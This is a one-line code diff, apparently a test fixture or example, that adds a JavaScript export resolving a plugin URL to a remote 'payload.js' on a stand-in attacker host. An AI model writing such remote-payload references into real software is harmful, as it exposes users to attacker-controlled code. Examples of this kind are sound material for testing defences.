@@ -1,0 +1,1 @@
+export const pluginUrl = import.meta.resolve("https://attacker.invalid/payload.js");
